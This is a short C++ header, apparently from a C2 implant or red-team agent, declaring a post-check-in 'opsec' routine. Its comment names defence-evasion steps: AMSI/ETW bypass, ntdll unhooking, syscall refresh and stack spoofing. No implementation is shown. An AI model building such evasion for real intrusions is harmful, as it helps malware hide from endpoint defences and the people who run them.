#pragma once

namespace opsec {

// AMSI/ETW, ntdll restore, syscall refresh, stack spoof — once after register.
void post_checkin();

} // namespace opsec
